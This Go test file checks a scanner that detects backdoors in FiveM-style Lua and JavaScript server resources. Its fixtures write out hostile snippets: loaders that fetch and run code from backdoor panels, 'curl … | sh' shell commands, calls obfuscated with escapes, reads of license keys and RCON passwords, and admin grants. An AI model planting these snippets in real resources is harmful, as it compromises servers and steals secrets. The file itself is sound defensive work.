package backdoor

import (
	"fmt"
	"strings"
	"testing"
)

// hex spells s as \xHH escapes, as obfuscated loaders do.
func hex(s string) string {
	var b strings.Builder
	for _, c := range []byte(s) {
		fmt.Fprintf(&b, `\x%02x`, c)
	}
	return b.String()
}

// uni spells s as JavaScript's \uHHHH escapes.
func uni(s string) string {
	var b strings.Builder
	for _, r := range s {
		fmt.Fprintf(&b, `\u%04x`, r)
	}
	return b.String()
}

func dec(s string) string {
	var b strings.Builder
	for _, c := range []byte(s) {
		fmt.Fprintf(&b, `\%d`, c)
	}
	return b.String()
}

func codes(s string) string {
	n := make([]string, 0, len(s))
	for _, c := range []byte(s) {
		n = append(n, fmt.Sprint(c))
	}
	return strings.Join(n, ", ")
}

func TestBackdoors(t *testing.T) {
	for _, c := range []struct {
		name, file, src, rule string
		sev                   Severity
		line                  int
	}{
		{
			"cipher loader", "server.lua",
			`PerformHttpRequest('https://cipher-panel.me/_i/i?to=Xb4c1', function (e, d) pcall(function() assert(load(d))() end) end)`,
			"backdoor-panel", High, 1,
		},
		{
			"blum panel", "sv.js",
			`const u = "https://blum-panel.me/api/" + GetCurrentResourceName();`,
			"backdoor-panel", High, 1,
		},
		{
			"request and load on one line", "server/main.lua",
			`PerformHttpRequest("https://example.ru/a", function(c, b) if b then assert(load(b))() end end, "GET")`,
			"remote-code", High, 1,
		},
		{
			"request then load lines later", "server/main.lua",
			"local function go()\n  PerformHttpRequest(url, function(code, body)\n    if code == 200 then\n      local fn = load(body)\n      fn()\n    end\n  end)\nend",
			"remote-code", High, 4,
		},
		{
			"hidden PerformHttpRequest in hex", "a.lua",
			`_G["` + hex("PerformHttpRequest") + `"]("https://x.y/z", function(a, b) end)`,
			"hidden-call", High, 1,
		},
		{
			"hidden load in decimal escapes", "a.lua",
			`local f = _G["` + dec("load") + `"]`,
			"hidden-call", High, 1,
		},
		{
			"hidden name in string.char", "a.lua",
			`local n = string.char(` + codes("PerformHttpRequest") + `)`,
			"hidden-call", High, 1,
		},
		{
			"hidden require in JS unicode escapes", "a.js",
			`const cp = global["` + uni("require") + `"]("child" + "_process");`,
			"hidden-call", High, 1,
		},
		{
			"hidden in fromCharCode", "a.js",
			`const k = String.fromCharCode(` + codes("eval") + `);`,
			"hidden-call", High, 1,
		},
		{
			"shell command", "server.lua",
			"local ok = true\nos.execute('curl http://1.2.3.4/x | sh')",
			"shell", High, 2,
		},
		{
			"popen", "server.lua",
			`local h = io.popen("whoami")`,
			"shell", High, 1,
		},
		{
			"license key", "server.lua",
			`local key = GetConvar("sv_licenseKey", "")`,
			"secret-convar", High, 1,
		},
		{
			"rcon password from JS", "server.js",
			`const pw = GetConvar('rcon_password', '');`,
			"rcon-convar", Medium, 1,
		},
		{
			"eval of base64", "server.js",
			`eval(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString());`,
			"encoded-eval", High, 1,
		},
		{
			"fetch and eval", "server.js",
			`fetch("https://x.y/p").then(r => r.text()).then(t => eval(t));`,
			"remote-code", High, 1,
		},
		{
			"https get then new Function", "server.js",
			"https.get(u, res => {\n  let s = '';\n  res.on('data', d => s += d);\n  res.on('end', () => new Function(s)());\n});",
			"remote-code", High, 4,
		},
		{
			"child_process", "server.js",
			`const { exec } = require("child_process");`,
			"child-process", Medium, 1,
		},
		{
			"child_process import", "server.mjs",
			`import { spawn } from 'node:child_process';`,
			"child-process", Medium, 1,
		},
		{
			"long escaped blob", "x.lua",
			`local p = "` + hex(strings.Repeat("abcdefgh", 6)) + `"`,
			"obfuscated", Medium, 1,
		},
		{
			"js obfuscator", "x.js",
			strings.Repeat("var _0x1a2b=_0x3c4d;", 10),
			"obfuscated", Medium, 1,
		},
		{
			"grant admin", "server.lua",
			`ExecuteCommand('add_principal identifier.license:abc group.admin')`,
			"grant-admin", Medium, 1,
		},
		{
			"loadstring", "server.lua",
			`local f = loadstring(code)`,
			"run-string", Low, 1,
		},
		{
			"assert load", "server.lua",
			`assert(load(LoadResourceFile(GetCurrentResourceName(), "config.lua")))()`,
			"run-string", Low, 1,
		},
	} {
		t.Run(c.name, func(t *testing.T) {
			got := Scan(c.file, []byte(c.src))
			if len(got) == 0 {
				t.Fatalf("no finding in %q", c.src)
			}
			f := got[0]
			if f.Rule != c.rule || f.Severity != c.sev || f.Line != c.line || f.File != c.file {
				t.Fatalf("got %+v; want %s %s at line %d", f, c.rule, c.sev, c.line)
			}
			if f.Title == "" || f.Excerpt == "" || len(f.Excerpt) > excerptLen {
				t.Errorf("title %q, excerpt %q", f.Title, f.Excerpt)
			}
		})
	}
}

// Honest resource code gives nothing.
func TestHonestCode(t *testing.T) {
	for name, src := range map[string]string{
		"chat.lua": `RegisterNetEvent('chat:addMessage')
AddEventHandler('chat:addMessage', function(msg)
  print(("\27[32m%s\27[0m"):format(msg))
end)`,
		"version.lua": `PerformHttpRequest("https://api.github.com/repos/x/y/releases/latest", function(code, body)
  if code ~= 200 then return end
  local data = json.decode(body)
  if data.tag_name ~= GetResourceMetadata(GetCurrentResourceName(), "version", 0) then
    print("An update is available")
  end
end)`,
		"config.lua": `Config = {}
Config.Locale = "en"
Config.Payload = "{}"
local text = LoadResourceFile(GetCurrentResourceName(), "data.json")`,
		"ui.js": `const greeting = "caf` + uni("é") + `";
on("onResourceStart", (name) => console.log(name));
const s = String.fromCharCode(72, 105);`,
		"license.lua":  `local host = GetConvar("sv_hostname", "")`,
		"newlines.lua": `print("line\nline\tend")`,
	} {
		if got := Scan(name, []byte(src)); len(got) > 0 {
			t.Errorf("%s: %+v", name, got)
		}
	}
}

func TestBinaryIsSkipped(t *testing.T) {
	if got := Scan("x.lua", []byte("FXAP\x00\x01os.execute('x')")); got != nil {
		t.Errorf("escrowed file: %+v", got)
	}
}

func TestDecode(t *testing.T) {
	for in, want := range map[string]string{
		hex("load"):                 "load",
		dec("os.execute"):           "os.execute",
		`string.char(108, 111, 97)`: `"loa"`,
		`a\u{6c}b`:                  "alb",
		`no escapes`:                "no escapes",
		`string.char(9999999)`:      `string.char(9999999)`,
		`\300`:                      `\300`,
	} {
		if got := decode(in, anyLang); got != want {
			t.Errorf("decode(%q) = %q, want %q", in, got, want)
		}
	}
	// Lua's decimal escapes aren't JavaScript's.
	if got := decode(`\108`, jsLang); got != `\108` {
		t.Errorf("js decimal: %q", got)
	}
}

func TestExcerpt(t *testing.T) {
	line := strings.Repeat("a", 1000) + " os.execute('x') " + strings.Repeat("b", 1000)
	f := Scan("big.lua", []byte(line))
	if len(f) != 1 || !strings.Contains(f[0].Excerpt, "os.execute") || len(f[0].Excerpt) > excerptLen {
		t.Fatalf("%+v", f)
	}
	f = Scan("x.lua", []byte(`_G["`+hex("os.execute")+"\x01"+`"]`))
	if len(f) != 1 || strings.ContainsRune(f[0].Excerpt, 1) {
		t.Fatalf("control character kept: %+v", f)
	}
}

func TestExtensions(t *testing.T) {
	for _, s := range RuleSets {
		if len(Extensions(s)) == 0 {
			t.Errorf("%s reads no files", s)
		}
	}
	if Extensions("nope") != nil {
		t.Error("unknown set")
	}
}

// A line reports the first rule that matches, so the most severe go first,
// and every rule has a title and a test above.
func TestRuleOrder(t *testing.T) {
	rank := map[Severity]int{High: 0, Medium: 1, Low: 2}
	seen := map[string]bool{}
	for i, r := range rules {
		if i > 0 && rank[r.sev] < rank[rules[i-1].sev] {
			t.Errorf("%s (%s) after %s (%s)", r.id, r.sev, rules[i-1].id, rules[i-1].sev)
		}
		if r.title == "" || seen[r.id] {
			t.Errorf("%s: no title, or a second rule with its id", r.id)
		}
		seen[r.id] = true
	}
}
